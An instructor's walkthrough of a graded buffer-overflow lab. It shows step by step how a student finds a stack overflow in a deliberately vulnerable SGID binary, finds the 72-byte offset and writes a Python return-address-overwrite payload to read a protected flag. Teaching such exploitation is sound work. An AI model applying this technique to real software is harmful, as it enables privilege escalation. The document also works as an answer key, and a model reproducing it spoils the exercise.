# Instructor Walkthrough: Lab 04 (Basic Buffer Overflow)

This document provides a detailed, step-by-step walkthrough of exactly how a student experiences and solves Lab 04, from the moment they turn on the VM to the moment they capture the flag.

---

## Phase 1: Initialization & Discovery

### 1. Booting the VM & Logging In
The student boots the VM in VirtualBox or VMware. They are greeted by the terminal or GUI login screen displaying the pre-login banner (`VaultTech Ethical Hacking Lab 04`). They log in using the credentials provided by the instructor (default: `student` / `labpassword`).

### 2. The Personalization Wizard
Immediately after the GUI loads, a GNOME autostart script triggers a popup window (`zenity`). 
- It welcomes them to the "Basic Buffer Overflow" lab.
- It asks for their unique **Student ID**.
- Once entered and confirmed, a progress bar appears for ~30 seconds. In the background, `setup.sh` runs as root: compiling the vulnerable C program, setting its SGID permissions, locking down the firewall, disabling ASLR, and generating a mathematically unique flag bound to their ID and your secret salt.
- A success popup tells them to open a terminal and navigate to `/srv/labs/lab04/bin`.

---

## Phase 2: Reconnaissance & Analysis

### 3. Inspecting the Target
The student opens a terminal and lists the files:
```bash
cd /srv/labs/lab04/bin
ls -la
```
They will see the `vuln` executable. They should notice the permissions: `-rwxr-sr-x 1 root lab04`. 
The `s` (SGID bit) means that when `student` runs this file, the process temporarily gains the privileges of the `lab04` group. This is their path to privilege escalation.

### 4. Testing the Program Manually
The student runs the program to see what it does:
```bash
./vuln
```
*Output:*
```text
--- VaultTech Legacy Authentication System ---
[DEBUG] print_flag function is located at: 0x4004d6
Enter your name: 
```
They type "Abdelrhman" and hit enter. The program says "Hello, Abdelrhman!" and exits normally.

### 5. Finding the Vulnerability
The student tests for a buffer overflow by sending a long string of 'A's. 
```bash
python3 -c "print('A' * 100)" | ./vuln
```
The program outputs: `Segmentation fault (core dumped)`. 
They have confirmed the buffer overflow exists and that they can overwrite memory and crash the program.

---

## Phase 3: Exploitation

### 6. Finding the Target Address
The student needs to hijack the program's execution flow and force it to jump to the `print_flag` function. 
They already have the address from the debug print out (`0x4004d6`). If they missed it, they can use `objdump`:
```bash
objdump -t vuln | grep print_flag
```

### 7. Determining the Offset (Padding)
The student must figure out exactly how many bytes of junk data ('A's) are needed to fill the buffer before they start overwriting the critical "Return Address" (RIP register). 
They can use `gdb` with a cyclic pattern (e.g., `pwndbg` or `gef`), or they can do manual binary search testing.
- 64 'A's: Normal Exit
- 72 'A's: Segmentation Fault

Through testing, they discover the buffer + saved base pointer requires exactly **72 bytes** of padding. The very next 8 bytes overwrite the return address.

### 8. Crafting the Payload
The student writes a small payload script. Since x86-64 processors use "Little-Endian" architecture, the memory address `0x00000000004004d6` must be written backwards in the payload: `\xd6\x04\x40\x00\x00\x00\x00\x00`.

They use Python to print 72 'A's, followed by the raw bytes of the target address:
```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xd6\x04\x40\x00\x00\x00\x00\x00')" > exploit.bin
```

---

## Phase 4: Execution & Capture

### 9. Launching the Exploit
The student pipes their crafted binary payload directly into the vulnerable program:
```bash
cat exploit.bin | ./vuln
```

### 10. Retrieving the Flag
The vulnerable program reads the 72 'A's (filling the buffer) and then reads the address of `print_flag`, which overwrites the return address. 
When the `vuln()` function finishes, instead of returning normally, the CPU jumps to `print_flag()`. 

Because the binary was running with the `lab04` SGID bit, `print_flag()` successfully bypasses Linux file permissions and opens `/etc/lab04_flag`.

*Terminal Output:*
```text
--- VaultTech Legacy Authentication System ---
[DEBUG] print_flag function is located at: 0x4004d6
Enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA @!
Congratulations! Here is your flag:
FLAG{a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p}
```

The student copies this `FLAG{...}` and submits it to the instructor for grading. The instructor verifies it using the `generate_student_flags.py` tool.
